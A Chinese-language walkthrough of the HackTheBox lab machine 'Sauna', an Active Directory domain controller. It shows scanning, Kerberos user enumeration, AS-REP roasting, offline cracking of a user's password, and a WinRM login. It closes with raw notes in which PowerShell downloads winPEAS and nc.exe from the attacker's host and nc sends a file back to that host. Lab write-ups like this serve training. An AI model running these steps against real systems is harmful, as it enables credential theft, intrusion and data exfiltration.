# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

端口发现
```
┌──(root💀kali)-[~/htb/Sauna]
└─# nmap -p- -Pn 10.10.10.175 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 09:23 EST
Nmap scan report for 10.10.10.175
Host is up (0.26s latency).
Not shown: 65515 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49697/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1192.54 seconds

```

详细端口信息
```
──(root💀kali)-[~/htb/Sauna]
└─# nmap -Pn -sV -A -O 10.10.10.175 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49686,49697
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 09:45 EST
Nmap scan report for 10.10.10.175
Host is up (0.26s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-03 22:45:17Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     adws?
| fingerprint-strings: 
|   DNSStatusRequestTCP, Kerberos, SMBProgNeg, afp, oracle-tns: 
|_    Ihttp://schemas.microsoft.com/ws/2006/05/framing/faults/UnsupportedVersion
49667/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open     msrpc         Microsoft Windows RPC
49677/tcp open     msrpc         Microsoft Windows RPC
49686/tcp filtered unknown
49697/tcp open     msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9389-TCP:V=7.91%I=7%D=1/3%Time=61D30C0C%P=x86_64-pc-linux-gnu%r(DNS
SF:StatusRequestTCP,4B,"\x08Ihttp://schemas\.microsoft\.com/ws/2006/05/fra
SF:ming/faults/UnsupportedVersion")%r(Kerberos,4B,"\x08Ihttp://schemas\.mi
SF:crosoft\.com/ws/2006/05/framing/faults/UnsupportedVersion")%r(SMBProgNe
SF:g,4B,"\x08Ihttp://schemas\.microsoft\.com/ws/2006/05/framing/faults/Uns
SF:upportedVersion")%r(oracle-tns,4B,"\x08Ihttp://schemas\.microsoft\.com/
SF:ws/2006/05/framing/faults/UnsupportedVersion")%r(afp,4B,"\x08Ihttp://sc
SF:hemas\.microsoft\.com/ws/2006/05/framing/faults/UnsupportedVersion");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-03T22:46:21
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   253.57 ms 10.10.14.1
2   254.12 ms 10.10.10.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.12 seconds


```

枚举域名
```
┌──(root💀kali)-[~/htb/Sauna]
└─# crackmapexec smb 10.10.10.175 -u 'anonymous' -p '' --shares                                 
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\anonymous: STATUS_LOGON_FAILURE 

```
得到一个域名：```EGOTISTICAL-BANK.LOCAL```

枚举了一大轮，拿不到任何有用的东西。无法打开smb分享目录，也不知道任何有用的用户名。

## Kerberos

使用nmap枚举kerberos的用户名
```
──(root💀kali)-[~/htb/Sauna]
└─# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="EGOTISTICAL-BANK.LOCAL",userdb=/usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt 10.10.10.175
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 07:03 EST
Nmap scan report for 10.10.10.175
Host is up (0.30s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL
|     Administrator@EGOTISTICAL-BANK.LOCAL
|_    administrator@EGOTISTICAL-BANK.LOCAL

Nmap done: 1 IP address (1 host up) scanned in 41.32 seconds

```

看见只有一个administrator的用户名，这个显然目前我们是没有权限的

80端口的http服务看起来像是一个公司的介绍网页，尝试制作一份user名单

```cewl -d 1 -m 3 -w user.txt 10.10.10.175```

再用制作成的名单枚举kerberos的用户名
```
┌──(root💀kali)-[~/htb/Sauna]
└─# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="EGOTISTICAL-BANK.LOCAL",userdb=/root/htb/Sauna/user.txt 10.10.10.175
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 08:00 EST
Nmap scan report for 10.10.10.175
Host is up (0.30s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    sauna@EGOTISTICAL-BANK.LOCAL

Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds

```

得到一个新的用户名```sauna```


## web
在about us页面暴露出了team member的名字，手动制作一个用户名字典
把我们上面找到的两个kerberos的用户名也加上这个字典
```
┌──(root💀kali)-[~/htb/Sauna]
└─# cat user
Fergus Smith
Fergus
Smith
Fergus.Smith
FergusSmith
Fergus.S
fsmith
Shaun Coins
Shaun
Coins
Shaun.Coins
ShaunCoins
Shaun.C
scoins
Hugo Bear
Hugo
Bear
Hugo.Bear
HugoBear
Hugo.B
hbear
Bowie Taylor
Bowie
Taylor
Bowie.Taylor
BowieTaylor
Bowie.T
btaylor
Sophie Driver
Sophie
Driver
Sophie.Driver
SophieDriver
Sophie.D
sdriver
Steven Kerb
Steven
Kerb
Steven.Kerb
StevenKerb
Steven.K
skerb
sauna
administrator

```

使用```GetNPUsers.py```尝试向kerberos请求不需要预认证的票据

[hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast)里的解释:

> That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

```
┌──(root💀kali)-[~/htb/Sauna]
└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile /root/htb/Sauna/user  -outputfile hashes.asreproast -dc-ip 10.10.10.175

```

可以看到拿到一个```fsmith```的票据
```
┌──(root💀kali)-[~/htb/Sauna]
└─# cat hashes.asreproast 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:85853ae8057c9c84f1ae5e3860cfcf35$29c704dfe2ce770414e478fcb530171c1b749dce35187d79c2679d93eaa6d2f5cd068123b2e4bbe3f59a94c1e589aa494ab81aa8d5c5c4d0bfdfa7a77320c3651f69e58550327e188e1b551f4d7d5a85fd0d541793c37e1908197d535f32ac12442756f3d5264610f155bcf1f341b29fa07234aaf7cd10a74c8fea80dddf6a8f5364633faf65313b81401888d24115e8c1bdb6fa2b45cf88b95c7f0b02f64cdf3ac44eb71fca52b9c187fa91bbcc9bd743ea59b8625abb2e8c94e632df4f3e2a8d50ed035e8b796e1ee1d57b1d6d85b4813af2b76c2af16da1ac9b2880f20c2afdac285dc57c200595de6d22df40eba458438d6b3082b3a66bebeeea0e04aacc

```

john破解
```
┌──(root💀kali)-[~/htb/Sauna]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:10 DONE (2022-01-03 10:33) 0.09775g/s 1030Kp/s 1030Kc/s 1030KC/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

拿到一个用户凭证：```fsmith:Thestrokes23```

使用evil-winrm登录，拿到foodhold和user.txt
```
┌──(root💀kali)-[~/htb/Sauna]
└─# evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith

```

# 提权

```
┌──(root💀kali)-[~/htb/Sauna]
└─# smbmap -u "fsmith" -p "Thestrokes23" -H 10.10.10.175 
[+] IP: 10.10.10.175:445        Name: 10.10.10.175                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        RICOH Aficio SP 8300DN PCL 6                            NO ACCESS       We cant print money
        SYSVOL                                                  READ ONLY       Logon server share 

```

smbmap -u "fsmith" -p "Thestrokes23" -H 10.10.10.175 

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.7:8000/winPEASx64.exe','C:\Users\FSmith\Desktop\winPEASx64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.7:8000/nc.exe','C:\Users\FSmith\Desktop\nc.exe')"


&{C:\Users\FSmith\Desktop\nc.exe 10.10.14.7 9995} < o.txt

smbclient -U 'fsmith%Thestrokes23' -L  //10.10.10.175/SYSVOL

smbclient -U 'fsmith%Thestrokes23' -N \\\\10.10.10.175\\SYSVOL

smbclient -U 'fsmith%Thestrokes23' \\\\10.10.10.175\\SYSVOL